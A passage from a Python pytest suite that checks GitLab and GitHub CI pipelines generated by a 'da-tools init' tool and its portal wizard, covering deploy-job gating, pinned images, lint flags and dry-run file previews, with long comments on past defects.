        "A knob wired to nothing is worse than no knob: the operator believes "
        "they changed the run's behaviour and they did not — #1361 shipped a "
        "`dry_run` that did exactly this. Wire it, or delete it."
    )


@pytest.mark.parametrize("ci,deploy", GL_COMBOS)
def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
    generated, ci, deploy
) -> None:
    """⛔ A production-deploy job must not be reachable from arbitrary pipelines.

    This is #1356's mirror image on the other CI. #1356 was an ``apply`` that
    could never run; this is an ``apply`` that can ALWAYS run — and the shipped
    GitLab pipeline had it: a bare ``rules: - when: manual``, while every other
    job in the same file carried a real condition (``changes:`` on the validate
    jobs, ``if: $CI_PIPELINE_SOURCE == "merge_request_event"`` on generate).

    The rule being applied is GitLab's own, not a list of bad spellings: a
    ``rules:`` entry with no ``if:``/``changes:``/``exists:`` matches EVERY
    pipeline. So a job holding ``environment: production`` plus cluster-write
    credentials rendered a play button on every push and every merge request —
    including one opened by any Developer-role contributor, against code that
    was never merged and whose own validate jobs never even ran (their
    ``changes:`` filter would not have matched).

    Two properties, because each fails on its own:
      1. no unconditional rule entry on a job that declares an environment;
      2. the condition actually constrains the BRANCH. A rule conditioned only
         on, say, ``$CI_PIPELINE_SOURCE`` satisfies (1) while still offering the
         button on every merge request.
    """
    path = generated[(ci, deploy)] / _GL_PIPELINE
    pipeline = yaml.safe_load(path.read_text(encoding="utf-8"))
    jobs = _gitlab_jobs(pipeline)

    # ⛔ Floor first. This pin is consumed by a `for … in .items()` loop, which
    # is the one exact-pin shape in this file that RETIRES SILENTLY: every other
    # one is an `==` or `in` and reds when emptied, but emptying this dict left
    # 95 passed. The rules it pins are load-bearing (a `when: never` on
    # validate-config is caught by nothing else), so it gets the same floor the
    # counter-example corpora got.
    #
    # ⚠️ The floor is DERIVED, not a literal. It used to be `>= 3`, which was
    # simply the job count of the day; when #1358 removed `generate-routes`
    # the correct pin and the stale literal became indistinguishable, and the
    # tempting repair is to edit 3 to 2 — which re-creates the same trap one
    # job later. Deriving it from `_EXPECTED_GL_JOBS` means the floor tracks
    # the pipeline: every non-deploy job must have its gate pinned, whatever
    # that set becomes.
    _non_deploy = _EXPECTED_GL_JOBS - {"apply"}
    assert set(_EXPECTED_GL_JOB_RULES) == _non_deploy, (
        f"_EXPECTED_GL_JOB_RULES pins {sorted(_EXPECTED_GL_JOB_RULES)} but the "
        f"non-deploy jobs are {sorted(_non_deploy)} — emptying or shrinking it "
        "makes the loop below a no-op that still reports green. A `when: never` "
        "on validate-config is caught by nothing else."
    )
    assert _non_deploy, (
        "_EXPECTED_GL_JOBS contains no non-deploy job, so the loop below "
        "describes nothing."
    )
    assert set(_EXPECTED_GL_JOB_RULES) <= _EXPECTED_GL_JOBS, (
        "_EXPECTED_GL_JOB_RULES names jobs that are not in _EXPECTED_GL_JOBS: "
        f"{sorted(set(_EXPECTED_GL_JOB_RULES) - _EXPECTED_GL_JOBS)}"
    )
    # ⛔ Same rule as the GitHub leg's `continue-on-error` ban, with NO
    # exemptions — the two legs must reach the same verdict on the same input.
    #
    # ⚠️ An earlier version of this exempted `lint-custom-rules` and justified it
    # as "custom rule-packs are advisory by design". That justification was
    # invented here: the generator carried `allow_failure: true` with no comment,
    # and nothing anywhere recorded a decision. Checked against the actual tool
    # instead of the assumption: `da-tools lint --ci` exits non-zero on ERROR
    # only, its ERRORs are the governance deny-list on tenant-authored PromQL
    # (denied functions/patterns, missing required labels), WARN-level naming
    # nits never affect the exit code — and this platform gates ITSELF on that
    # same script in ci.yml and validate.yaml with `--ci` and no exemption. The
    # exemption was weaker than the tool's own severity call and weaker than what
    # we hold ourselves to, so it is gone rather than documented.
    assert set(pipeline) == _EXPECTED_GL_TOP_LEVEL, (
        f"GitLab top-level keys are {sorted(map(str, pipeline))}, expected "
        f"{sorted(_EXPECTED_GL_TOP_LEVEL)}.\nA new GLOBAL key is invisible to "
        "every other assertion here — `include:` pulls third-party CI config "
        "into a pipeline that holds cluster-write credentials, and `default:` "
        "injects into every job including `apply`. Both are valid per the "
        "schema, so this equality is the only thing that can see them."
    )

    # ⛔ Every job's image, not just the deploy stage's. The GitHub leg pins its
    # whole `uses:` set with versions; here only `apply`'s image was pinned
    # (test_init_project.py), so swapping `validate-config`'s
    # `image: $DA_TOOLS_IMAGE` for `alpine:3.20` left 95 passed — the validation
    # stage would then run without the tool it exists to run.
    for jname, job in jobs.items():
        image = job.get("image")
        image = image.get("name") if isinstance(image, dict) else image
        # ⛔ …and the variable must EXIST. `startswith("$")` alone accepted
        # `$DA_TOOLS_IMAGE_TYPO` (93 passed, schema happy) — GitLab expands an
        # undefined variable to empty, so the job stops running the tool it
        # exists to run. Presence of a sigil is not a reference.
        assert str(image).lstrip("$").strip("{}") in (pipeline.get("variables") or {}), (
            f"job {jname!r} runs image {image!r}, which names no declared "
            f"variable (have {sorted(pipeline.get('variables') or {})}). "
            "GitLab expands an undefined variable to the empty string."
        )
        assert str(image).startswith("$"), (
            f"job {jname!r} runs image {image!r}, which is not one of the "
            "pipeline's `variables:`. Every image here is meant to come from a "
            "variable the customer can override in one place; a literal pins "
            "them to whatever this generator happened to emit."
        )

    # ⛔ Floor. Every sibling collection in this file got one for this exact
    # shape (`_NEEDS`, `_EXPECTED_GL_JOB_RULES`, `_UNSUPPORTED_IFS`,
    # `_BYPASSES`, `DEPLOY_CHOICES`) — this one was missed. Measured: emptying
    # it while moving all three `apply` jobs into `stage: validate` left
    # 93 passed, i.e. the production play button in stage 1 with no red.
    assert set(_EXPECTED_GL_JOB_STAGES) == _EXPECTED_GL_JOBS, (
        f"_EXPECTED_GL_JOB_STAGES covers {sorted(_EXPECTED_GL_JOB_STAGES)}, "
        f"but the job set is {sorted(_EXPECTED_GL_JOBS)} — every job needs a "
        "pinned stage, or the loop below silently skips it."
    )
    for jname, want_stage in _EXPECTED_GL_JOB_STAGES.items():
        assert jobs[jname].get("stage") == want_stage, (
            f"job {jname!r} runs in stage {jobs[jname].get('stage')!r}, expected "
            f"{want_stage!r}. Stage ORDER is pinned below, but order alone does "
            "nothing if a job is assigned to a different stage — moving `apply` "
            "into `validate` puts the production deploy button in stage 1."
        )

    # ⛔ GitLab's SECOND level: `allow_failure` is legal inside a `rules:` entry
    # and overrides the job-level value. Banning only the job level is the same
    # one-level-of-two gap the GitHub leg had for `continue-on-error` — measured:
    # `allow_failure: true` on `apply`'s rule entry left 95 passed. (The three
    # validation jobs are incidentally covered by the exact rules pin, so the
    # hole landed exactly on the deploy job.)
    for jname, job in jobs.items():
        for entry in (job.get("rules") or []):
            if not isinstance(entry, dict):
                continue
            assert str(entry.get("allow_failure", "false")).lower() == "false", (
                f"job {jname!r} has a rules entry with `allow_failure: "
                f"{entry.get('allow_failure')!r}`. A rule-level value overrides "
                "the job, so the gate stops gating while the job block still "
                "looks strict."
            )

    for jname, job in jobs.items():
        assert str(job.get("allow_failure", "false")).lower() == "false", (
            f"job {jname!r} sets `allow_failure: {job.get('allow_failure')!r}`. "
            "A stage that is allowed to fail does not gate anything, and stage "
            "order is the only thing putting this before the production deploy. "
            "The GitHub artifact runs the same checks with no exemption — an "
            "exemption here makes the two legs disagree about the same input."
        )

    for jname, expected_rules in _EXPECTED_GL_JOB_RULES.items():
        assert jobs[jname].get("rules") == expected_rules, (
            f"job {jname!r} rules are {jobs[jname].get('rules')!r}, expected "
            f"{expected_rules!r}. These are the gates that decide whether the "
            "customer's validation jobs are created at all; a rule that matches "
            "nothing (or `when: never`) leaves the pipeline with only `apply` — "
            "a manual production deploy with nothing having validated anything. "
            "This file's stated boundaries also reason FROM these rules, so a "
            "change here has to be argued, not absorbed."
        )

    # ⛔ The dead-knob property, on THIS leg too. It was enforced for the GitHub
    # artifact only, and the GitLab one shipped the identical defect at the same
    # time: `variables: MONITORING_NS` declared in all three deploy branches
    # while every script hardcoded `-n monitoring`. Measured: reverting the
    # GitHub side to hardcoded literals reds 4 tests; the same defect on this
    # side red nothing, because nothing looked. A property enforced on one leg
    # of a pair is the shape that has produced the most defects in this file.
    # ⛔ Shell comments stripped, and EVERY place GitLab lets a variable be read.
    # Two separate holes were measured here: a `script:` line that only mentions
    # `$MONITORING_NS` inside a `# TODO:` comment made the whole guard pass
    # (84 passed, 0 failed) with the dead variable still shipping; and the
    # surface omitted `before_script`, `after_script`, `environment:`,
    # `artifacts:`, job-level `variables:` and variable-to-variable
    # interpolation, so a genuinely-read variable would have been reported dead.
    # One is a false negative and the other a false positive — the same list
    # fixes both, which is why the surface is enumerated from GitLab's schema
    # rather than from the two places this generator happens to use today.
    _READ_KEYS = (
        "image", "rules", "script", "before_script", "after_script",
        "environment", "artifacts", "variables", "needs", "cache",
    )
    # ⛔ Strip BEFORE `str()`, one scalar at a time. Stripping the repr of a list
    # is a complete no-op: `str(["a # b"])` wraps every element in Python quotes,
    # so the comment-stripper's quote tracker never leaves the quoted state and
    # no `#` is ever seen as a comment. Measured on the shipped pipeline:
    # `_strip_shell_comments(str(script)) == str(script)`. The previous version
    # of this block added the stripper and claimed the false negative was closed;
    # it was not — a `- |` block whose only mention of `$MONITORING_NS` was a
    # `# TODO:` line still passed 95/95. Flattening to scalars first is the
    # difference between calling the helper and using it.
    def _flat(value) -> list[str]:
        if isinstance(value, str):
            return [value]
        if isinstance(value, list):
            return [s for v in value for s in _flat(v)]
        if isinstance(value, dict):
            return [s for v in value.values() for s in _flat(v)]
        return [] if value is None else [str(value)]

    scalars: list[str] = _flat(pipeline.get("default")) + _flat(pipeline.get("workflow"))
    for j in jobs.values():
        for k in _READ_KEYS:
            scalars.extend(_flat(j.get(k)))
    # A variable may also be read by another variable's value.
    scalars.extend(_flat(pipeline.get("variables")))
    read_surface = "\n".join(_strip_shell_comments(s) for s in scalars)
    # ⛔ `--ci` on the lint invocation is LOAD-BEARING and was unpinned. The whole
    # argument for removing `allow_failure` is "`da-tools lint --ci` exits
    # non-zero on ERROR only" — drop the flag and the command reports violations
    # and exits 0, so the job passes and the deny-list stops gating. Measured:
    # dropping it left 95 passed. A guard whose justification rests on a flag
    # must pin that flag. (`validate-config` is the mirror case and needs the
    # OPPOSITE: it declares no `--ci` and exits non-zero on failure by default —
    # see the CLI-flag guard, which now catches passing one that does not exist.)
    lint_argvs = [
        a for j in jobs.values() for s in (j.get("script") or [])
        for a in _command_argvs(_strip_shell_comments(str(s)))
        if "lint" in a
    ]
    assert lint_argvs, "no `da-tools lint` invocation found in the pipeline"
    for argv in lint_argvs:
        assert "--ci" in argv, (
            f"`da-tools lint` is invoked without `--ci`: {argv}. Without it the "
            "command prints deny-list ERRORs and exits 0, so the job goes green "
            "and the governance gate this pipeline relies on stops gating."
        )

    dead_vars = sorted(
        k for k in (pipeline.get("variables") or {})
        if not re.search(rf"\$\{{?{re.escape(str(k))}(?![\w-])", read_surface)
    )
    assert not dead_vars, (
        f"the `--deploy {deploy}` pipeline declares variable(s) {dead_vars} "
        "that no job's `image:`, `rules:` or `script:` reads. A customer edits "
        "the one namespace-looking name in the file and nothing changes — the "
        "#1361 class, in `variables:`. Wire it, or declare it only in the "
        "branches whose scripts use it."
    )

    deploying = {n: b for n, b in jobs.items() if "environment" in b}
    assert deploying, (
        f"no job in the `--deploy {deploy}` pipeline declares an `environment:` "
        "— either the deploy stage vanished or it stopped naming its target, "
        "and this guard would grade nothing. Point it at the new shape."
    )

    # ⛔ Stage ORDER, not just membership. `apply` carries no `needs:`, so stage
    # order is the ONLY thing sequencing it after validation — and this file's
    # boundary paragraph reasons from exactly that. Membership was asserted;
    # sequence was not. Measured: reordering to `[apply, validate, generate]`
    # left 95 passed, and the manual play button then sits in stage 1, where an
    # operator can deploy before `validate-config` has run at all.
    # ⚠️ Two stages, not three: the GitLab leg has no blast-radius job (#1358,
    # option C). The ORDER is what this assertion is really about — the deploy
    # job carries no `needs:`, so `stages:` is the only thing keeping
    # validation ahead of deployment — and that property is unchanged.
    assert pipeline.get("stages") == ["validate", "apply"], (
        f"`stages:` is {pipeline.get('stages')!r}, expected "
        "['validate', 'apply']. "
        "The deploy job carries no `needs:`, so this order is the only thing "
        "putting validation before deployment. A boundary stated in prose must "
        "not rest on an unenforced fact."
    )

    # ⛔ The environment NAME, same as the GitHub leg — and the reason is if
    # anything stronger here: GitLab binds protected environments (deployment
    # approvals, who may deploy) and environment-scoped CI/CD variables — where
    # the customer puts KUBE_CONFIG — to the NAME. Renaming detaches both while
    # every other assertion still passes. The GitHub twin was pinned with an
    # explicit argument for why names matter; this leg was left selecting on
    # mere presence, which is the same one-leg-of-a-pair gap again.
    for name, body in deploying.items():
        env_name = body["environment"]
        if isinstance(env_name, dict):
            env_name = env_name.get("name")
        assert env_name == "production", (
            f"job {name!r} deploys to environment {env_name!r}, not "
            "'production'. GitLab attaches protected-environment approvals and "
            "environment-scoped variables (the customer's cluster credentials) "
            "to that name, so a rename detaches both silently."
        )

    for name, body in deploying.items():
        env = body["environment"]
        rules = body.get("rules")
        assert rules, (
            f"job {name!r} deploys to {env!r} but declares no `rules:` at all — "
            "GitLab then adds it to every pipeline unconditionally."
        )
        # ⛔ EVERY entry, one at a time. GitLab `rules:` are OR-ed and
        # first-match-wins, so the safety property is universally quantified:
        # ONE compliant entry does not redeem the others, it just sits beside
        # them. The first version of this check flattened all entries into a
        # single string (`" ".join(...)`) before looking for CI_DEFAULT_BRANCH,
        # which turned a for-all into an exists — measured: adding
        # `- if: $CI_PIPELINE_SOURCE == "merge_request_event"` / `when: manual`
        # beside the branch rule left the suite at 93 passed while restoring the
        # every-merge-request deploy button this test exists to prevent.
        for entry in rules:
            assert isinstance(entry, dict), (
                f"job {name!r} has a non-mapping rules entry {entry!r}; this "
                "guard reads `if:`/`when:` per entry and cannot grade that"
            )
            assert _GITLAB_RULE_CONDITIONS & set(entry), (
                f"job {name!r} deploys to {env!r} and has rule entry {entry!r} "
                "with no `if:`/`changes:`/`exists:`. Such an entry matches "
                "EVERY pipeline, so this is a production-deploy button on every "
                "push and every merge request. (GitHub sibling: "
                "workflow_dispatch-only; here: "
                "`if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH`.)"
            )
            # ⛔ EXACT expression, allowlisted — not "does the string mention
            # CI_DEFAULT_BRANCH". Substring matching on an expression grades the
            # variable's PRESENCE, never its MEANING, and both ways of widening
            # survive it. Measured, each against an 83-passed baseline:
            #   `$CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH`   -> 83 passed
            #   `... == ... || $CI_PIPELINE_SOURCE == "merge_request_event"`
            #                                               -> 83 passed
            # The first inverts the guard (deploy from every branch EXCEPT main);
            # the second re-opens every merge request. Note the second is the
            # same widening the per-entry loop above already catches when it is
            # written as a separate entry (control: 6 failed) — moving it inside
            # one entry's expression walked straight past. Fixing the aggregation
            # across entries and leaving it inside an entry is the identical
            # mistake one level down, which is why this is now an equality
            # against a set of expressions whose meaning has been argued.
            cond = str(entry.get("if", "")).strip()
            assert cond in _GITLAB_DEPLOY_CONDITIONS, (
                f"job {name!r} deploys to {env!r} with rule condition {cond!r}, "
                f"which is not one this guard has agreed to: "
                f"{sorted(_GITLAB_DEPLOY_CONDITIONS)}.\n"
                "This is deliberately an equality: `!=`, `||`, and anything else "
                "that changes what the expression MEANS all contain the right "
                "variable name. If a new condition is genuinely correct, add it "
                "to _GITLAB_DEPLOY_CONDITIONS with the reasoning — do not relax "
                "this into a substring test."
            )
            # `when:` matters as much as `if:`. Dropping `when: manual` (a
            # plausible "make CD automatic" edit) makes this fire on every push
            # to the default branch — `kubectl apply` + `rollout restart` into
            # production with no human in the loop — while the GitHub sibling
            # still demands an explicit workflow_dispatch. Alignment means both
            # halves: which branch, AND that a person presses it.
            assert entry.get("when") == "manual", (
                f"job {name!r} deploys to {env!r} and rule entry {entry!r} is "
                f"`when: {entry.get('when')!r}`, not `manual`. That deploys "
                "automatically on every matching pipeline; the GitHub sibling "
                "requires an explicit workflow_dispatch."
            )


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_ci_selection_controls_which_artifacts_exist(generated, ci, deploy) -> None:
    """``--ci`` must gate the artifact trees, in both directions.

    Checked over the whole directory, not just the one expected filename: a
    dispatch bug that wrote a *differently named* workflow would slip past a
    single ``exists()`` call.
    """
    root = generated[(ci, deploy)]
    gh_files = sorted(p.name for p in (root / ".github" / "workflows").glob("*")
                      ) if (root / ".github" / "workflows").is_dir() else []
    gl_files = sorted(p.name for p in (root / ".gitlab-ci.d").glob("*")
                      ) if (root / ".gitlab-ci.d").is_dir() else []

    if ci in _EMITS_GITHUB:
        assert gh_files == [_GH_WORKFLOW.name], f"--ci {ci} emitted {gh_files}"
    else:
        assert gh_files == [], (
            f"--ci {ci} must not emit GitHub Actions files, got {gh_files}"
        )

    if ci in _EMITS_GITLAB:
        assert gl_files == [_GL_PIPELINE.name], f"--ci {ci} emitted {gl_files}"
        # #1357 — and the root shell that makes the above reachable. Checked
        # here as well as in its own test because THIS test is the one that
        # owns the both-directions property: a dispatch bug that emitted the
        # root shell under `--ci github` would leave GitLab loading a pipeline
        # that includes a file which does not exist, i.e. a hard pipeline
        # error on a customer who never asked for GitLab.
        assert (root / _GL_ROOT_SHELL).is_file(), (
            f"--ci {ci} wrote {_GL_PIPELINE.as_posix()} but no root "
            f"{_GL_ROOT_SHELL.as_posix()}. GitLab auto-loads that path only, "
            "so the pipeline is inert again (#1357)."
        )
    else:
        assert gl_files == [], (
            f"--ci {ci} must not emit GitLab CI files, got {gl_files}"
        )
        assert not (root / _GL_ROOT_SHELL).exists(), (
            f"--ci {ci} must not emit a root {_GL_ROOT_SHELL.as_posix()}: it "
            "would `include:` a pipeline this selection never wrote, which "
            "GitLab reports as a pipeline configuration error."
        )


# ============================================================
# ── 4. The portal wizard's preview (a SECOND generator) ──
# ============================================================

# Same regex the real bundler uses (tools/portal/build.mjs
# stripFrontmatterPlugin): the portal's .js sources carry a YAML frontmatter
# doc-block that is not valid JavaScript, so it must be removed before node can
# load the module. Line count is preserved so any node stack trace still points
# at the right source line.
_FRONTMATTER_RE = re.compile(r"^---\r?\n[\s\S]*?\r?\n---\s*(?:\r?\n|$)")


def _portal_module(tmp_path: Path) -> str:
    """Materialise generators.js as a loadable ESM module; return its URI."""
    stripped = _FRONTMATTER_RE.sub(
        lambda m: "\n" * m.group(0).count("\n"),
        _PORTAL_GENERATORS.read_text(encoding="utf-8"),
        count=1,
    )
    assert "cicdGenerateGitHubActionsPreview" in stripped
    assert not stripped.lstrip().startswith("---"), "frontmatter strip failed"

    module = tmp_path / "generators.mjs"
    module.write_text(stripped, encoding="utf-8")
    # json.dumps, not repr: a Python repr yields single-quoted strings and a
    # Windows file URI is full of characters worth not hand-quoting.
    return json.dumps(module.as_uri())


def _call_portal(tmp_path: Path, fn: str, config: dict) -> str:
    """Evaluate one exported generator against ``config`` and return stdout."""
    driver = (
        f"import {{ {fn} }} from {_portal_module(tmp_path)};\n"
        f"const out = {fn}({json.dumps(config)});\n"
        f"process.stdout.write(typeof out === 'string' "
        f"? out : JSON.stringify(out));\n"
    )
    proc = _run([_NODE, "--input-type=module", "-e", driver])
    assert proc.returncode == 0, (
        f"could not evaluate the portal generator {fn}:\n"
        f"{proc.stdout}\n{proc.stderr}"
    )
    return proc.stdout


def _load_portal_preview(tmp_path: Path, deploy: str) -> str:
    return _call_portal(
        tmp_path,
        "cicdGenerateGitHubActionsPreview",
        {"deploy": deploy, "tenants": [], "packs": []},
    )


@_needs_node
@_needs_actionlint
@pytest.mark.parametrize("deploy", DEPLOY_CHOICES)
def test_portal_preview_workflow_passes_actionlint(tmp_path, deploy) -> None:
    """The wizard shows this YAML to the user as a copy-me sample.

    ⛔ Honest framing: this leg PINS THE STATUS QUO. All three deploy branches
    already passed actionlint before this test existed — the portal preview
    never had the #1347 defect, because its ``apply:`` is written inline at the
    right indentation instead of being spliced in from a second template. What
    it buys is that the *other* generator can no longer regress unnoticed, and
    that the two generators' divergence (issue #1351) is measurable rather than
    assumed.

    The deploy values come from the CLI parser on purpose: the wizard is a UI
    over the same `da-tools init` flags, so a new CLI deploy method that the
    wizard has not learned about should surface here.
    """
    workflow = _load_portal_preview(tmp_path, deploy)
    out = tmp_path / f"portal-preview-{deploy}.yaml"
    out.write_text(workflow, encoding="utf-8")

    proc = _run([_ACTIONLINT, "-shellcheck=", "-pyflakes=", str(out)])
    assert proc.returncode == 0, (
        f"actionlint rejected the portal CI/CD wizard preview for "
        f"deploy={deploy}:\n{proc.stdout}\n{proc.stderr}"
    )


@_needs_node
@pytest.mark.parametrize("deploy", DEPLOY_CHOICES)
def test_portal_preview_top_level_shape(tmp_path, deploy) -> None:
    """Binary-free counterpart of the test above (see the YAML-1.1 `on:` note)."""
    workflow = yaml.safe_load(_load_portal_preview(tmp_path, deploy))
    assert set(workflow) == {"name", True, "jobs", "permissions"}, (
        f"unexpected top-level keys in the portal preview for deploy={deploy}: "
        f"{sorted(map(str, workflow))}"
    )
    assert set(workflow["jobs"]) == {"validate", "generate", "apply"}
    # ⛔ Value, not just key — the same half-contract that let the CLI copy lose
    # `pull-requests: write` silently. The expected value DIFFERS from the CLI's
    # on purpose: this preview's generate job writes `.output/` and posts
    # nothing, so a write scope here would be a privilege the sample never uses
    # and a bad default for whoever copies it. If a comment step is ever added
    # to the preview, this fails and asks for the scope to be re-derived.
    # ⛔ Pin the ACTION SET, not the absence of one hard-coded action name.
    # Selecting on `"sticky-pull-request-comment" in uses` fails OPEN here (any
    # other PR-commenting action satisfies "no comment step" while still needing
    # `pull-requests: write`, which this preview does not grant) while the same
    # shape on the CLI leg fails CLOSED — measured: adding
    # `peter-evans/create-or-update-comment@v4` to the preview left 93 passed,
    # the mirror edit on the CLI leg reds 12. An exact set has no such asymmetry.
    uses = sorted(
        str(s["uses"]).split("@")[0]
        for job in workflow["jobs"].values()
        for s in (job.get("steps") or [])
        if s.get("uses")
    )
    assert uses == ["actions/checkout"] * 3, (
        f"portal preview uses actions {uses}, expected three checkouts and "
        "nothing else. A step that talks to the GitHub API needs a scope this "
        "preview deliberately does not grant — add the scope AND update this "
        "pin together, or drop the step."
    )
    # ⛔ The SAME contract the CLI artifact is held to, via the shared helper —
    # job-level overrides, dead inputs, and the deploy job's `environment:`.
    # Grading only the CLI leg is what let both of this PR's own fixes be
    # re-shipped from this generator with the suite green.
    _assert_github_deploy_contract(
        workflow, f"portal preview (deploy={deploy})", {"contents": "read"},
        _PORTAL_GH_TRIGGERS,
        _PORTAL_GH_USES,
        expects_lint=False,
    )


@_needs_node
@pytest.mark.parametrize("deploy", DEPLOY_CHOICES)
def test_portal_preview_job_event_gating(tmp_path, deploy) -> None:
    """The preview carried the #1356 `needs:` defect too — this holds the fix.

    Unlike the column-0 indentation bug (which the preview never had, because
    its ``apply:`` is written inline), the ``needs: [validate, generate]`` +
    ``workflow_dispatch`` combination was present in BOTH generators. So this
    leg is not status-quo pinning: it is the second half of an actual fix, and
    it keeps the two hand-written copies from re-diverging on this axis while
    #1351 is open.
    """
    _assert_job_event_reachability(
        yaml.safe_load(_load_portal_preview(tmp_path, deploy)),
        f"portal CI/CD wizard preview (deploy={deploy})",
        _GH_JOB_EVENTS,
        _GH_JOB_NEEDS,
    )


@_needs_node
def test_portal_preview_actually_varies_with_the_deploy_choice(tmp_path) -> None:
    """⛔ Anti-vacuity floor for the `deploy` axis of the three tests above.

    The CLI matrix got a floor (``test_matrix_matches_the_independent_hand_
    written_floor``); this axis did not, and it needs one for the same reason.
    Every preview test is parametrized over ``DEPLOY_CHOICES``, so all three
    report N cases and read like N-way coverage — but nothing checked the three
    cases were DIFFERENT. If the preview generator stops reading
    ``config.deploy`` (a rename, a typo, a refactor of the config shape), all
    three branches fall through to the ``argocd`` else and the suite runs the
    same YAML three times, still green.

    Measured before this existed: renaming ``config.deploy`` to
    ``config.deployMethod`` in generators.js left 64 passed unchanged.

    Pairwise distinctness is the assertion because it needs no knowledge of what
    each branch should contain — it only requires that the choice reached the
    output at all, which is exactly the property the parametrize claims.
    """
    previews = {d: _load_portal_preview(tmp_path, d) for d in DEPLOY_CHOICES}
    assert len(DEPLOY_CHOICES) >= 2, (
        f"DEPLOY_CHOICES is {DEPLOY_CHOICES!r} — with fewer than two options "
        "this floor cannot measure anything and the axis is not coverage."
    )
    collisions = [
        (a, b)
        for i, a in enumerate(DEPLOY_CHOICES)
        for b in DEPLOY_CHOICES[i + 1:]
        if previews[a] == previews[b]
    ]
    assert not collisions, (
        f"the portal preview is byte-identical for deploy choice(s) "
        f"{collisions} — the wizard stopped reading `config.deploy`, so every "
        "preview test above is now running the same case N times while "
        "reporting N-way coverage. Check "
        "tools/portal/src/interactive/tools/cicd-setup-wizard/utils/"
        "generators.js (cicdGenerateGitHubActionsPreview) and rebuild "
        "docs/assets/dist/."
    )


# ============================================================
# ── 5. "Which files do you get?" — the third claim surface ──
# ============================================================
#
# The workflow YAML is not the only thing these two generators promise. Both
# also answer "what will `da-tools init` put in my repo?" — the CLI through its
# --dry-run preview, the wizard through the ASCII tree on its summary step. Two
# hand-written answers to a question a third piece of code (run_init) actually
# decides, which is the shape that produced #1351 in the first place.

# Independent of everything under test: written from the four unconditional
# `_write_file` calls in run_init, not derived from _preview_files or from the
# portal. A floor taken from either side would be satisfied by both sides
# collapsing to empty together.
_ALWAYS_WRITTEN = frozenset({
    "conf.d/_defaults.yaml",
    ".pre-commit-config.da.yaml",
    ".da-init.yaml",
})


def _files_written(root: Path) -> set[str]:
    """The artifact itself — walk the tree, do not ask the tool what it did."""
    return {
        p.relative_to(root).as_posix() for p in root.rglob("*") if p.is_file()
    }


@pytest.mark.parametrize(
    "config_source,git_repo",
    [("configmap", ""), ("git", "https://git.example.invalid/ops.git")],
    ids=["configmap", "gitops"],
)
@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_dry_run_preview_matches_what_run_init_writes(
    tmp_path, ci, deploy, config_source, git_repo,
) -> None:
    """``--dry-run`` must list exactly the files the real run writes.

    The ``gitops`` axis is not decoration: GitOps Native Mode (run_init step 3b)
    writes ``kustomize/overlays/gitops/{kustomization,git-sync-patch}.yaml``
    for ANY --deploy value, and ``_preview_files`` had no branch for it.
    Measured before the fix: the preview understated every gitops run by two
    files, one of them a Deployment patch — a user who ran --dry-run to see
    whether init would touch ``kustomize/`` was told it would not, and then it
    did. Equality, not containment: an over-promise (a path previewed but never
    created) is the same defect pointed the other way.

    ⛔ The preview is taken BEFORE the write, and that ordering is now
    load-bearing rather than incidental. Since #1357 one artifact — the root
    ``.gitlab-ci.yml`` — is conditional on the target REPO rather than on the
    flags, so ``_preview_files`` reads the filesystem. Calling it after
    ``run_init`` (which is what this test used to do) asks it about a directory
    the write already changed, and it answers correctly about the wrong world.
    ``main()`` exits inside ``--dry-run`` and never reaches the writer, so
    before-the-write is also the real call order.

    The ``brownfield`` phase covers the case no flag can express: a repo that
    already has a root ``.gitlab-ci.yml``. The preview must not promise a file
    the writer is going to refuse to touch.
    """
    config = {
        "ci": ci,
        "deploy": deploy,
        "rule_packs": ["mariadb"],
        "tenants": ["db-a"],
        "namespace": "monitoring",
        "da_tools_image": "ghcr.io/vencil/da-tools:latest",
        "config_source": config_source,
        "git_repo": git_repo,
    }

    for phase in ("greenfield", "brownfield"):
        target = tmp_path / phase
        target.mkdir()
        preexisting: set[str] = set()
        if phase == "brownfield":
            (target / ".gitlab-ci.yml").write_text(
                "stages: [build]\n", encoding="utf-8", newline="\n",
            )
            preexisting = {".gitlab-ci.yml"}

        basep = PurePosixPath(target.as_posix())
        preview = {
            str(PurePosixPath(p).relative_to(basep))
            for p in ip._preview_files(config, str(target))
        }
        ip.run_init(config, str(target))
        # The customer's own file is not something init claims to write, so it
        # is excluded from the comparison rather than from the test — that it
        # survives untouched is asserted directly in
        # `test_gitlab_root_shell_wires_the_pipeline`.
        actual = _files_written(target) - preexisting

        assert _ALWAYS_WRITTEN <= actual, (
            f"run_init wrote {sorted(actual)} for --ci {ci} --deploy {deploy} "
            f"({phase}); the files every run is supposed to produce are "
            "missing, so comparing it against the preview would compare two "
            "empties."
        )
        assert preview == actual, (
            f"`da-tools init --ci {ci} --deploy {deploy}` (config_source="
            f"{config_source}, {phase}) previews a different file set than it "
            f"writes.\n"
            f"  previewed but never created: {sorted(preview - actual)}\n"
            f"  created but never previewed: {sorted(actual - preview)}\n"
            "Fix _preview_files to follow run_init — never the reverse."
        )


# ── `--dry-run`'s two WARNINGS, which nothing looked at ───────────────────
#
# ⛔ `grep -rn "_handle_dry_run" tests/` returned zero hits. The test above
# is the only thing that exercises the dry-run path at all, and it compares
# FILE SETS — it never captures stdout, so both of the function's warning
# legs could be deleted whole and the suite stayed green.
#
# They are not cosmetic. `--dry-run` exits before `_print_summary`, which is
# the only place the manual-wiring instruction lives, so on a repo where the
# GitLab leg will be inert the ONLY signal a dry run can give is these lines.
# An absent filename is not a signal: the reader has no way to learn that the
# file they did not see listed is the one that makes the rest of them run.
#
# ⚠️ The negative half is the load-bearing half, and it is the one that was
# actually wrong once: warning UNCONDITIONALLY told a customer with a
# correctly wired split-pipeline repo that their config would not be loaded,
# and promised a remedy the real run never prints — from the flag whose
# entire job is "what will this do to my repo".
_DRYRUN_MARKERS = {
    # locale: (subdirectory warning, brownfield-GitLab warning)
    "en": ("not the repository root", "this tool will not modify it"),
    "zh": ("不是 repo 根目錄", "本工具不會修改它"),
}


def test_dry_run_marker_table_covers_both_locales() -> None:
    """⛔ Anti-vacuity for the axis below: dropping a locale must be RED."""
    assert set(_DRYRUN_MARKERS) == {"en", "zh"}, sorted(_DRYRUN_MARKERS)


def _dry_run_output(config: dict, target: Path, capsys) -> str:
    with pytest.raises(SystemExit) as exc:
        ip._handle_dry_run(config, str(target))
    assert exc.value.code == 0, exc.value.code
    return capsys.readouterr().out


def _config(**over) -> dict:
    base = {
